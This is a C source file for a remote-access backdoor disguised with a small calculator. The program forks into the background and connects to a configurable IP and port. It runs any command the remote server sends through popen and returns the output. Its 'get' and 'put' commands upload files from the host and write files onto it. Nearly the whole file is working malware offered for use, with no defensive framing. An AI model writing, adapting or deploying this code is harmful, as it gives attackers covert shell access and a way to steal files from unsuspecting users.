// Add some libs
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
    _____________________
    |*******************|
    |====CHANCE=PORT====|
    |*******************|

    ____________________
    |-------------------|
    |=====CHANCE=IP=====|
    |-------------------|

*/

// define some Macros
#define PORT 8088
#define IP "127.0.0.1"
#define BUFFER_SIZE 4096


// Connect handler
int conn(int *sockt);

// Get command and run
int getcommand(int sockt);

// Send file
int sndf(int sockt, char *filename);

// Receive file
int recvf(int sockt, char *filename);

// Calculator
void calculator();


int main(void)
{
    int sockt;

    // Fork a new process
    pid_t pid = fork();
    if (pid < 0)
    {
        // Fork failed
        fprintf(stderr, "Error: Fork failed\n");
        return 1;
    }

    if (pid > 0)
    {
        // Parent process: exit
        printf("Parent process exiting, child PID: %d\n", pid);
        exit(0);
    }

    // Child process: Connect to server
    if (conn(&sockt) != 0)
    {
        return 1; // Handle error
    }

    // Get command and execute
    if (getcommand(sockt) != 0)
    {
        close(sockt);
        return 1; // Handle error
    }

    // Get calculator
    calculator();

    // Close socket
    close(sockt);
    return 0;
}


// Connect handler
int conn(int *sockt)
{
    // Conttection adress
    struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr)); // Clear the structure
     addr.sin_family = AF_INET;
     addr.sin_port = htons(PORT); // Convert port to network byte order
     addr.sin_addr.s_addr = inet_addr(IP);

    // Create a socket
    *sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (*sockt < 0)
    {
        // Handle error
        fprintf(stderr, "Error: Socket can't be created\n");
        return 1;
    }

    // Connect to server
    if (connect(*sockt, (struct sockaddr*)&addr, sizeof(addr)) != 0)
    {
        fprintf(stderr, "Error: server can't connect\n");
        return 1;
    }

    return 0;
}


// Get command and run
int getcommand(int sockt)
{
    // define some veriables
    char command[200];
    int bytesReceived;

    while (1)
    {
        // Reset command buffer
        memset(command, 0, sizeof(command));

        // Receive command from server
        bytesReceived = recv(sockt, command, sizeof(command) - 1, 0);
        if (bytesReceived <= 0)
        {
            // Handle error or connection closed
            fprintf(stderr, "Error: receiving command failure\n");
            return 1;
        }


        // Check for exit command
        if (strncmp(command, "close", 5) == 0 || strncmp(command, "exit", 4) == 0)
        {
            break; // Exit the loop
        }

        // Check for get for sending files
        if (strncmp(command, "get", 3) == 0)
        {
            // Filename
            char filename[100];

            // Parse command
            sscanf(command, "get %s", filename);

            // Send file
            if (sndf(sockt, filename) != 0)
            {
                // in error case print error
                fprintf(stderr, "Error: sending file failed\n");
            }

            // Next loop
            continue;
        }

        // Check for put for receiving files
        if (strncmp(command, "put", 3) == 0)
        {
            // Filename
            char filename[100];

            // Parse command
            sscanf(command, "put %s", filename);

            // Get file
            if (recvf(sockt, filename) != 0)
            {
                // in error case print error
                fprintf(stderr, "Error: receiving file failed\n");
            }

            // Next loop
            continue;
        }


        // Execute the command and capture output
        FILE *fp;
        char output[1024];
        char result[2048]; // Buffer to hold the result to send to server
        memset(result, 0, sizeof(result));

        // Open a pipe to the command
        fp = popen(command, "r");
        if (fp == NULL)
        {
            // in error case Print error
            fprintf(stderr, "Error: failed to run command\n");
            continue; // Skip to the next command
        }

        // Read the output a line at a time - output it.
        while (fgets(output, sizeof(output), fp) != NULL)
        {
            strcat(result, output); // Append output to result
        }

        // Close the pipe
        pclose(fp);

        // Check if result is empty
        if (strlen(result) == 0)
        {
            // Send [EMPTY] Message
            if (send(sockt, "[EMPTY]\n", 9, 0) < 0) continue;
        } 
        
        else
        {
            // Send the output to the server
            if (send(sockt, result, strlen(result), 0) < 0)
            {
                // Print error
                fprintf(stderr, "Error: sending output to server failed\n");
            }
        }
    }

    // Exit sucess
    return 0;
}


// Send file
int sndf(int sockt, char *filename)
{
    FILE *fp;
    char buffer[BUFFER_SIZE];

    // Open the file
    fp = fopen(filename, "rb");
    if (fp == NULL) // Handle errors
    {
        fprintf(stderr, "Error: failed to open file\n");
        return 1;
    }

    // Send the file size
    fseek(fp, 0, SEEK_END);
    int fileSize = ftell(fp);
    rewind(fp);

    // Check for empty file
    if (fileSize <= 0) {
        fprintf(stderr, "Error: file is empty\n");
        fclose(fp);
        return 1;
    }

    // Send file size
    if (send(sockt, &fileSize, sizeof(fileSize), 0) < 0) return 1;

    // Send the file
    int bytesSent;
    while ((bytesSent = fread(buffer, 1, BUFFER_SIZE, fp)) > 0)
    {
        if (send(sockt, buffer, bytesSent, 0) < 0) return 1;
    }

    // Check for fread error
    if (ferror(fp)) {
        fprintf(stderr, "Error: failed to read file\n");
        fclose(fp);
        return 1;
    }

    // Close the file
    fclose(fp);

    return 0;
}


// Receive file
int recvf(int sockt, char *filename)
{
    // Define some veriables
    FILE *fp;
    char buffer[BUFFER_SIZE];
    int fileSize;

    // Receive the file size
    if (recv(sockt, &fileSize, sizeof(fileSize), 0) <= 0)
    {
        // Handle errors
        fprintf(stderr, "Error: failed to receive file size\n");
        return 1;
    }

    // Check for invalid file size
    if (fileSize < 0) {
        fprintf(stderr, "Error: invalid file size\n");
        return 1;
    }

    // Open the file
    fp = fopen(filename, "wb");
    if (fp == NULL) // handle errors
    {
        fprintf(stderr, "Error: failed to open file\n");
        return 1;
    }

    // Receive the file
    int bytesReceived;
    while (fileSize > 0 && (bytesReceived = recv(sockt, buffer, BUFFER_SIZE, 0)) > 0)
    {
        fwrite(buffer, 1, bytesReceived, fp);
        fileSize -= bytesReceived;
    }

    // Check for fread error
    if (bytesReceived < 0) {
        perror("Error receiving file");
        fclose(fp);
        return 1;
    }

    // Close the file
    fclose(fp);

    return 0;
}


// Calculator
void calculator()
{
    int select, num1, num2;

    printf("1. Addition\n2. Subtraction\n3. Multiplication\n4. Division\n\nSelect: ");
    scanf("%d", &select);

    printf("\nEnter two numbers: "); // Get 2 num
    scanf("%d %d", &num1, &num2);

    switch (select)
    {
        case 1:
            printf("\n%d + %d = %d", num1, num2, num1 + num2);
            break;
        
        case 2:
            printf("\n%d - %d = %d", num1, num2, num1 - num2);
            break;

        case 3:
            printf("\n%d * %d = %d", num1, num2, num1 * num2);
            break;

        case 4:
            if (num2 != 0) // Check for division by zero
            {
                printf("\n%d / %d = %.2f", num1, num2, (float)num1 / num2);
            }
            else
            {
                printf("\nError: Division by zero is not allowed.");
            }
            break;

        default:
            printf("\nInvalid selection. Please choose a valid operation.");
            break;
    }
}

